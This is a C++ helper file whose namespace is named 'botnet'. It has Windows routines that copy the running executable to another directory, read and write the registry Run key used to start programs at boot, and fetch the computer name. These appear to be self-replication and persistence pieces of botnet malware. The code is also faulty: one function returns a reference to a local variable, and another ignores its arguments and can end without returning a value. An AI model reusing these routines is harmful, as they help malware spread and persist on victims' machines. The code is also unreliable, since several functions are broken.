#include "utils.h"

#include <iostream>
#include <fstream>
#include <Windows.h>

namespace botnet {
    std::vector<std::string> split(const std::string& str,
        const std::string& sep) {
    char* cstr = const_cast<char*>(str.c_str());
    char* current;
    std::vector<std::string> arr;

    current = strtok(cstr, sep.c_str());
    while (current != NULL) {
        arr.push_back(current);
        current = strtok(NULL, sep.c_str());
    }
    return arr;
}

bool fileExists(const std::string& file) {
    TCHAR *sz_file = new TCHAR[file.size() + 1];
    sz_file[file.size()] = 0;

    std::copy(file.begin(), file.end(), sz_file);

    WIN32_FIND_DATA FindFileData;
    HANDLE handle = FindFirstFile(sz_file, &FindFileData);
    int found = handle != INVALID_HANDLE_VALUE;
    if (found) {
        FindClose(handle);
        return true;
    }
    return false;
}

std::string& my_name() {
    TCHAR exepath[MAX_PATH + 1];
    std::string appname = std::string();

    GetModuleFileName(NULL, exepath, MAX_PATH);
    appname = exepath;

    return appname;
}


bool copy_it_self(const std::string& dir, const std::string& fname) {
    std::streampos size;
    char * memblock;
    std::string path = dir + "\\" + fname;

    if (!fileExists(fname)) {
        CopyFile(my_name().c_str(), path.c_str(), FALSE);
    }

    return true;
}

std::wstring ReadRegValue(HKEY root, std::string key, std::string name)
{
    HKEY hkey;
    WCHAR szBuffer[1024];
    DWORD dwBufferSize = sizeof(szBuffer);
    ULONG nError;

    if (RegOpenKeyEx(root, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_READ, &hkey) != ERROR_SUCCESS)
        return std::wstring();

    nError = RegQueryValueExW(hkey, L"VBoxTray", 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);

    if (nError != ERROR_SUCCESS)
    {
        RegCloseKey(hkey);
        return std::wstring();
    }

    RegCloseKey(hkey);

}

std::string GetRegistry(char* StringName) {
    DWORD dwType = REG_SZ;
    HKEY hKey = 0;
    char value[1024];
    DWORD value_length = 1024;
    const char* subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    RegOpenKey(HKEY_LOCAL_MACHINE,subkey,&hKey);
    RegQueryValueEx(hKey, StringName, NULL, &dwType, (LPBYTE)&value, &value_length);
    return std::string(value);
}

int SetKeyData(HKEY hRootKey, char *subKey, DWORD dwType, char *value, LPBYTE data, DWORD cbData)
{
    HKEY hKey;
    if (RegCreateKey(hRootKey, subKey, &hKey) != ERROR_SUCCESS)
        return 0;

    if (RegSetValueEx(hKey, value, 0, dwType, data, cbData) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return 0;
    }

    RegCloseKey(hKey);
    return 1;
}

std::string getComputerName() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerName(buffer, &len))
        return std::string(buffer, len);
    return "UNKNOWN";
}

}
